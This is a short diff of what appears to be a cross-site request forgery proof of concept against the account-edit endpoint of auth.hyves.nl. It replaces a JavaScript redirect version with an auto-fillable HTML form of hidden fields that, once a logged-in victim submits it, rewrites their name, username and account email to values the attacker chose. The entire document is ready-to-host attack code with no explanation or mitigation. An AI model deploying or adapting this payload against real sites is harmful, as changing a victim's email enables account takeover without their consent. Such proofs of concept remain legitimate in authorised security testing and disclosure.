@@ -1,17 +1,16 @@
-<!doctype html>
-<html>
-<body>
-<script>
-location.href =
-  "https://auth.hyves.nl/account/edit?hyves_auth_header=hide" +
-  "&client_id=YOUR_CLIENT_ID" +
-  "&tenantId=YOUR_TENANT_ID" +
-  "&__cb_editPasswordOption=useExisting" +
-  "&user.firstName=CSRFTEST" +
-  "&user.middleName=Test" +
-  "&user.lastName=Test" +
-  "&user.username=csrf_test_123" +
-  "&user.email=test@example.com";
-</script>
-</body>
-</html>
+<form action="https://auth.hyves.nl/account/edit?hyves_auth_header=hide"
+      method="POST">
+
+  <input type="hidden" name="hyves_auth_header" value="hide">
+  <input type="hidden" name="client_id" value="...">
+  <input type="hidden" name="tenantId" value="...">
+  <input type="hidden" name="__cb_editPasswordOption" value="useExisting">
+
+  <input type="hidden" name="user.firstName" value="CSRF-TEST">
+  <input type="hidden" name="user.middleName" value="Test">
+  <input type="hidden" name="user.lastName" value="Fdd">
+  <input type="hidden" name="user.username" value="fddj">
+  <input type="hidden" name="user.email" value="testerr0092@gmail.com">
+
+  <button type="submit">Test</button>
+</form>
